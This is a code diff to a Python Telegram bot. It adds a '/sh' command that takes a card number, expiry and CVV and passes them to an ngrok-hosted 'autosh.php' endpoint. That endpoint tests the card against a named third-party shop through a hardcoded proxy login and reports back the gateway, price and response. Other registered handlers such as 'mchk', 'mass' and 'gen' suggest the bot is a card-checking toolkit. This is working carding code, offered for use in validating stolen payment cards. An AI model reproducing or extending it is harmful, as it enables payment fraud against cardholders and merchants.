@@ -2044,7 +2044,7 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     )
 
-    
+
 
 import time
 from datetime import datetime
@@ -2397,6 +2397,99 @@ async def background_check_multi(update, context, cards, processing_msg):
         os.remove(output_filename)
     except Exception:
         pass
+
+
+import aiohttp
+import json
+
+async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handles /sh command in the format: /sh card|mm|yyyy|cvv"""
+    try:
+        if not context.args:
+            await update.message.reply_text(
+                "⚠️ Usage: `/sh card|mm|yy or yyyy|cvv`",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        payload = " ".join(context.args).strip()
+        parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: `/sh 1234567812345678|12|2028|123`",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+
+        # Construct API URL
+        api_url = (
+            "https://7feeef80303d.ngrok-free.app/autosh.php"
+            f"?cc={cc}|{mm}|{yy}|{cvv}"
+            "&site=https://radiclerootsfarm.com"
+            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
+
+        await update.message.reply_text("⏳ Processing your request...")
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=30) as resp:
+                api_response = await resp.text()
+
+        # Try parsing JSON
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            await update.message.reply_text(
+                f"❌ Invalid response from API:\n```\n{api_response}\n```",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        # Extract fields
+        response = data.get("Response", "Unknown")
+        price = data.get("Price", "?")
+        gateway = data.get("Gateway", "Unknown")
+        card = data.get("cc", "N/A")
+        proxy_status = data.get("ProxyStatus", "Unknown")
+        proxy_ip = data.get("ProxyIP", "N/A")
+
+        # BIN Info (first 6 digits)
+        bin_number = card.split("|")[0][:6]
+
+        # Requester info
+        user = update.effective_user
+        requester = f"@{user.username}" if user.username else str(user.id)
+
+        # Developer link (set your constant)
+        DEVELOPER = "[YourDeveloperName](https://t.me/yourusername)"
+
+        # Format message
+        formatted_msg = (
+            f"✦━━━━━━━━━━━━━━✦\n"
+            f"🛠 Gateway: *{gateway.title()}* ({price}$)\n"
+            f"💳 Card: `{card}`\n"
+            f"📌 Response: *{response}*\n"
+            f"🌐 Proxy: *{proxy_status}* `{proxy_ip}`\n"
+            f"🔎 BIN: `{bin_number}`\n\n"
+            f"🙋 Requested by: {requester}\n"
+            f"👨‍💻 Developer: {DEVELOPER}\n"
+            f"✦━━━━━━━━━━━━━━✦"
+        )
+
+        await update.message.reply_text(
+            formatted_msg,
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Error: {safe_md(str(e))}",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        logging.exception("Error in /sh command handler")
+
 
 
 
@@ -3463,6 +3556,7 @@ def main():
     application.add_handler(CommandHandler("mchk", mchk_command))
     application.add_handler(CommandHandler("mass", mass_command))
     application.add_handler(CommandHandler("mtchk", mtchk))
+    application.add_handler(CommandHandler("sh", sh_command))
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("open", open_command))
     application.add_handler(CommandHandler("adcr", adcr_command))
